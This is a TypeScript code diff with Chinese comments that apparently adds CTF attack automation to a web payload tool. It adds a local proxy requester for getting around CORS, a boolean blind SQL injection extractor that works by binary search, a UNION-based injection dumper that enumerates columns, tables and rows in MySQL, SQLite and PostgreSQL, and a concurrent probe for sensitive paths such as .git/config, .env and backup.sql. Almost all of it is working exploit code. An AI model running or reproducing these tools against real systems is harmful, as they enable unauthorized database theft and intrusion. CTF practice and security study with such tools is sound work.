@@ -451,3 +451,348 @@ export const parseCurl = (command: string): CurlInfo | { error: string } => {
   if (!info.url) return { error: '未找到 URL。' };
   return info;
 };
+
+
+
+// ---- ⑧ 请求器（经本地 server 代理转发，绕浏览器 CORS）----
+
+export interface ProxyRequestSpec {
+  url: string;
+  method: string;
+  headers: Record<string, string>;
+  body: string | null;
+  timeoutMs?: number;
+}
+
+export interface ProxyResponse {
+  ok: boolean;
+  status: number;
+  statusText: string;
+  headers: Record<string, string>;
+  bodyText: string;
+  elapsedMs: number;
+  error?: string;
+}
+
+// 代理注入点（node 测试环境无 window/fetch 时由测试侧配置）
+type FetchLike = (input: string, init?: Record<string, unknown>) => Promise<Response>;
+let injectedFetch: FetchLike | null = null;
+let injectedOrigin: string | null = null;
+export const configureProxy = (fetchImpl: FetchLike, origin: string): void => {
+  injectedFetch = fetchImpl;
+  injectedOrigin = origin;
+};
+
+// 本地代理地址：同源（Electron 壳）优先，dev 模式回落 8081（PAYLOADER_PORT 默认）。
+export const sendViaProxy = async (spec: ProxyRequestSpec): Promise<ProxyResponse> => {
+  const fetchNow = injectedFetch ?? (typeof fetch !== 'undefined' ? fetch : null) as FetchLike | null;
+  if (!fetchNow) return { ok: false, status: 0, statusText: 'NO_FETCH', headers: {}, bodyText: '', elapsedMs: 0, error: '当前环境无 fetch。' };
+  const origin = injectedOrigin ?? (typeof window !== 'undefined' ? window.location.origin : 'http://127.0.0.1:8081');
+  const endpoints = [`${origin}/api/ctf/proxy`, 'http://127.0.0.1:8081/api/ctf/proxy'];
+  let lastError = '';
+  for (const endpoint of endpoints) {
+    try {
+      const response = await fetchNow(endpoint, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify(spec),
+      });
+      // 代理端点自身的 4xx（如非法 URL）也是合法 JSON 响应——透传，不当不可达
+      const parsed = await response.json().catch(() => null) as Partial<ProxyResponse> | null;
+      if (parsed && (typeof parsed.status === 'number' || typeof parsed.error === 'string')) {
+        return {
+          ok: false,
+          status: parsed.status ?? 0,
+          statusText: parsed.statusText ?? 'PROXY_ERROR',
+          headers: parsed.headers ?? {},
+          bodyText: parsed.bodyText ?? '',
+          elapsedMs: parsed.elapsedMs ?? 0,
+          error: parsed.error ?? '代理端点拒绝请求',
+        };
+      }
+      throw new Error(`代理端点 ${response.status}`);
+    } catch (error) {
+      lastError = error instanceof Error ? error.message : String(error);
+    }
+  }
+  return { ok: false, status: 0, statusText: 'PROXY_UNREACHABLE', headers: {}, bodyText: '', elapsedMs: 0, error: `本地代理不可达（${lastError}）——请通过 npm run serve 或客户端壳启动应用。` };
+};
+
+// ---- ⑨ 布尔盲注自动化（逐字符二分猜解）----
+
+export interface BlindBooleanOptions {
+  // URL 模板：{Q} 占位注入布尔断言（自动 URL 编码）
+  urlTemplate: string;
+  method?: string;
+  headers?: Record<string, string>;
+  bodyTemplate?: string | null;
+  // 成功判定（三选一，优先级从上到下）
+  successContains?: string;
+  successStatus?: number;
+  useOk?: boolean;
+  maxLen?: number;
+  charset?: string;
+  stopChars?: string;
+  delayMs?: number;
+  onProgress?: (found: string, tried: number) => void;
+}
+
+export interface BlindResult {
+  value: string;
+  requests: number;
+  stoppedAt: 'length-limit' | 'stop-char' | 'charset-exhausted' | 'no-progress';
+}
+
+// 二分前提：charset 必须按 ASCII 升序排列（大写 < '_' < 小写 < '{}'）
+const DEFAULT_FLAG_CHARSET = '!#$&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz{}';
+
+export const blindBooleanExtract = async (options: BlindBooleanOptions): Promise<BlindResult> => {
+  const {
+    urlTemplate, method = 'GET', headers = {}, bodyTemplate = null,
+    successContains, successStatus, useOk,
+    maxLen = 64, charset = DEFAULT_FLAG_CHARSET, stopChars = '}', delayMs = 0,
+    onProgress,
+  } = options;
+  const isSuccessful = (response: ProxyResponse): boolean => {
+    if (successContains !== undefined) return response.bodyText.includes(successContains);
+    if (successStatus !== undefined) return response.status === successStatus;
+    if (useOk) return response.ok;
+    return response.ok;
+  };
+  const runPayload = async (payload: string): Promise<ProxyResponse> => {
+    const url = urlTemplate.replace(/\{Q\}/g, encodeURIComponent(payload));
+    const body = bodyTemplate === null || bodyTemplate === undefined ? null : bodyTemplate.replace(/\{Q\}/g, payload);
+    const response = await sendViaProxy({ url, method, headers, body });
+    if (delayMs > 0) await new Promise(resolve => setTimeout(resolve, delayMs));
+    return response;
+  };
+
+  let found = '';
+  let requests = 0;
+  for (let position = 1; position <= maxLen; position += 1) {
+    // 存活探测：该位置还有字符吗（>0）
+    const alive = await runPayload(`ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),${position},1))>0`);
+    requests += 1;
+    if (!isSuccessful(alive)) return { value: found, requests, stoppedAt: 'no-progress' };
+    // 二分字符集
+    let low = 0;
+    let high = charset.length - 1;
+    while (low < high) {
+      const mid = Math.floor((low + high) / 2);
+      const probe = `ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),${position},1))>${charset.charCodeAt(mid)}`;
+      const response = await runPayload(probe);
+      requests += 1;
+      if (isSuccessful(response)) low = mid + 1;
+      else high = mid;
+      onProgress?.(found, requests);
+    }
+    const char = charset[low];
+    if (char === undefined) return { value: found, requests, stoppedAt: 'charset-exhausted' };
+    if (stopChars.includes(char)) return { value: found + char, requests, stoppedAt: 'stop-char' };
+    found += char;
+    onProgress?.(found, requests);
+  }
+  return { value: found, requests, stoppedAt: 'length-limit' };
+};
+
+// ---- ⑩ 联合注入自动脱库 ----
+
+export interface UnionDumpOptions {
+  // 注入点 URL：{INJ} 占位（payload 会被 URL 编码后替换）
+  baseUrl: string;
+  method?: string;
+  headers?: Record<string, string>;
+  bodyTemplate?: string | null;
+  database: 'mysql' | 'sqlite' | 'postgresql';
+  maxColumns?: number;
+  delayMs?: number;
+  onProgress?: (step: string, detail: string) => void;
+}
+
+export interface UnionDumpResult {
+  ok: boolean;
+  error?: string;
+  columnCount?: number;
+  reflectPositions?: number[];
+  currentDatabase?: string;
+  tables?: string[];
+  columns?: Record<string, string[]>;
+  rows?: Array<Record<string, string>>;
+  requests: number;
+}
+
+// 回显位 marker（数字串，正常页面不会出现）
+const markerFor = (position: number): string => `77${position * 7}x`;
+
+// UNION payload：把子查询拼在 marker 后放回显位（marker 拼接法——响应里 marker 紧跟数据，
+// extractAfterMarker 才能在页面噪声中定位提取；CONCAT 为 MySQL/PG，|| 为 SQLite/PG）
+const buildUnionPayload = (innerExpr: string, columnCount: number, reflectAt: number, database: 'mysql' | 'sqlite' | 'postgresql' = 'mysql'): string => {
+  const marker = markerFor(reflectAt);
+  const tagged = database === 'mysql'
+    ? `CONCAT('${marker}',(${innerExpr}))`
+    : `'${marker}'||(${innerExpr})`;
+  const parts = Array.from({ length: columnCount }, (_, i) => (i + 1 === reflectAt ? tagged : 'NULL'));
+  return `UNION SELECT ${parts.join(',')}-- -`;
+};
+
+// 从响应提取 marker 后到行尾/标签前的内容
+const extractAfterMarker = (bodyText: string, marker: string): string => {
+  const match = bodyText.match(new RegExp(`${marker}([^\\r\\n<]*)`));
+  return match ? match[1].trim() : '';
+};
+
+export const unionDump = async (options: UnionDumpOptions): Promise<UnionDumpResult> => {
+  const {
+    baseUrl, method = 'GET', headers = {}, bodyTemplate = null,
+    database = 'mysql', maxColumns = 20, delayMs = 0, onProgress,
+  } = options;
+  let requests = 0;
+  const inject = async (payload: string): Promise<ProxyResponse> => {
+    const url = baseUrl.replace(/\{INJ\}/g, encodeURIComponent(payload));
+    const body = bodyTemplate === null || bodyTemplate === undefined ? null : bodyTemplate.replace(/\{INJ\}/g, payload);
+    const response = await sendViaProxy({ url, method, headers, body });
+    requests += 1;
+    if (delayMs > 0) await new Promise(resolve => setTimeout(resolve, delayMs));
+    return response;
+  };
+
+  // 第一步：ORDER BY 探列数（状态码/响应长度/报错特征变化判定）
+  const baseline = await inject('ORDER BY 1-- -');
+  const isBroken = (response: ProxyResponse): boolean => {
+    if (response.status !== baseline.status) return true;
+    if (baseline.bodyText.length > 0 && response.bodyText.length === 0) return true;
+    const errorNow = /SQL|syntax|error|警告|错误|Warning/i.test(response.bodyText);
+    const errorBase = /SQL|syntax|error|警告|错误|Warning/i.test(baseline.bodyText);
+    return errorNow && !errorBase;
+  };
+  onProgress?.('探列数', 'ORDER BY 递增');
+  let columnCount = 0;
+  for (let n = 1; n <= maxColumns; n += 1) {
+    const response = await inject(`ORDER BY ${n}-- -`);
+    if (isBroken(response)) break;
+    columnCount = n;
+  }
+  if (columnCount === 0) return { ok: false, error: 'ORDER BY 1 即判定报错——注入点或判定特征需要调整（也可在 URL 里加引号闭合）。', requests };
+
+  // 第二步：UNION 定回显位
+  const markers = Array.from({ length: columnCount }, (_, i) => markerFor(i + 1));
+  const unionProbe = await inject(`UNION SELECT ${markers.join(',') }-- -`);
+  onProgress?.('定回显位', `列数 ${columnCount}`);
+  const reflectPositions: number[] = [];
+  markers.forEach((marker, index) => {
+    if (unionProbe.bodyText.includes(marker)) reflectPositions.push(index + 1);
+  });
+  if (reflectPositions.length === 0) {
+    return { ok: false, error: `列数 ${columnCount} 探出，但 UNION 占位未回显（尝试换注入参数或闭合方式）。`, columnCount, requests };
+  }
+  const reflectAt = reflectPositions[0];
+
+  // 第三步：按方言拉库名/表/列/数据
+  const dialect = {
+    mysql: {
+      currentDb: 'database()',
+      tables: (db: string) => `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='${db}'`,
+      columns: (table: string) => `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${table}'`,
+      rows: (table: string, cols: string[]) => `SELECT GROUP_CONCAT(CONCAT_WS(':',${cols.join(',')})) FROM ${table}`,
+    },
+    sqlite: {
+      currentDb: "''",
+      tables: () => `SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'`,
+      columns: (table: string) => `SELECT sql FROM sqlite_master WHERE name='${table}'`,
+      rows: (table: string, cols: string[]) => `SELECT GROUP_CONCAT(${cols.join(`||':'||`)}) FROM ${table}`,
+    },
+    postgresql: {
+      currentDb: 'current_database()',
+      tables: () => `SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public'`,
+      columns: (table: string) => `SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='${table}'`,
+      rows: (table: string, cols: string[]) => `SELECT STRING_AGG(${cols.join(`||':'||`)},',') FROM ${table}`,
+    },
+  }[database];
+
+  let currentDatabase = '';
+  if (database !== 'sqlite') {
+    const dbResponse = await inject(buildUnionPayload(dialect.currentDb, columnCount, reflectAt, database));
+    currentDatabase = extractAfterMarker(dbResponse.bodyText, markerFor(reflectAt)) || 'unknown';
+    onProgress?.('库名', currentDatabase);
+  }
+
+  const tablesResponse = await inject(buildUnionPayload(dialect.tables(currentDatabase), columnCount, reflectAt, database));
+  const tables = extractAfterMarker(tablesResponse.bodyText, markerFor(reflectAt)).split(',').filter(Boolean);
+  onProgress?.('表名', tables.join(', '));
+  if (tables.length === 0) return { ok: true, columnCount, reflectPositions, currentDatabase: currentDatabase || '(sqlite)', tables: [], columns: {}, rows: [], requests };
+
+  const columns: Record<string, string[]> = {};
+  const rows: Array<Record<string, string>> = [];
+  for (const table of tables.slice(0, 5)) {
+    const colsResponse = await inject(buildUnionPayload(dialect.columns(table), columnCount, reflectAt, database));
+    const colsText = extractAfterMarker(colsResponse.bodyText, markerFor(reflectAt));
+    if (database === 'sqlite') {
+      // 建表语句 → 列名（"name" TEXT 形态）
+      const names = [...colsText.matchAll(/"([A-Za-z_][A-Za-z0-9_]*)"\s+[A-Za-z]/g)].map(m => m[1]);
+      columns[table] = names.length > 0 ? names : [];
+    } else {
+      columns[table] = colsText.split(',').map(s => s.trim()).filter(Boolean);
+    }
+    const targetCols = columns[table].slice(0, 3);
+    if (targetCols.length > 0) {
+      const rowsResponse = await inject(buildUnionPayload(dialect.rows(table, targetCols), columnCount, reflectAt, database));
+      const rowsText = extractAfterMarker(rowsResponse.bodyText, markerFor(reflectAt));
+      for (const row of rowsText.split(',').filter(Boolean)) {
+        const values = row.split(':');
+        rows.push(Object.fromEntries(targetCols.map((c, i) => [c, values[i] ?? ''])));
+      }
+    }
+    onProgress?.('脱数据', `${table}（${columns[table].length} 列）`);
+  }
+  return { ok: true, columnCount, reflectPositions, currentDatabase: currentDatabase || '(sqlite)', tables, columns, rows, requests };
+};
+
+// ---- ⑪ 目录探测（CTF 高频敏感路径小字典）----
+
+export const DIR_WORDLIST: ReadonlyArray<string> = [
+  'flag', 'flag.txt', 'flag.php', 'flag.html', 'f1ag.txt', 'fl4g.txt',
+  'robots.txt', '.git/config', '.git/HEAD', '.DS_Store', '.env', '.htaccess',
+  'index.php.bak', 'index.php~', 'index.bak', 'backup.sql', 'db.sql', 'dump.sql',
+  'www.zip', 'web.zip', 'backup.zip', 'src.zip', 'code.zip', 'website.zip',
+  'admin', 'admin/', 'admin.php', 'login', 'login.php', 'shell.php',
+  'swagger', 'swagger/', 'api-docs', 'phpinfo.php', 'info.php', 'test.php',
+  'console', '.svn/entries', 'WEB-INF/web.xml', 'composer.json', 'package.json',
+  'README.md', 'readme.txt', 'debug.txt', 'config.php', 'config.php.bak',
+];
+
+export interface DirProbeHit {
+  path: string;
+  status: number;
+  length: number;
+  note: string;
+}
+
+export const probeDirectories = async (
+  baseUrl: string,
+  options: { concurrency?: number; onProgress?: (done: number, total: number) => void } = {},
+): Promise<DirProbeHit[]> => {
+  const { concurrency = 6, onProgress } = options;
+  const normalized = baseUrl.replace(/\/+$/, '');
+  const hits: DirProbeHit[] = [];
+  let done = 0;
+  const queue = [...DIR_WORDLIST];
+  const worker = async (): Promise<void> => {
+    for (;;) {
+      const path = queue.shift();
+      if (path === undefined) return;
+      const response = await sendViaProxy({ url: `${normalized}/${path}`, method: 'GET', headers: {}, body: null });
+      done += 1;
+      onProgress?.(done, DIR_WORDLIST.length);
+      if (response.status !== 0 && response.status !== 404 && response.status !== 403) {
+        hits.push({
+          path: `/${path}`,
+          status: response.status,
+          length: response.bodyText.length,
+          note: response.status === 200 ? (response.bodyText.length < 64 ? '小文件，优先看' : '正常页面') : '重定向/异常状态，跟进',
+        });
+      }
+    }
+  };
+  await Promise.all(Array.from({ length: concurrency }, worker));
+  return hits.sort((a, b) => a.status - b.status);
+};
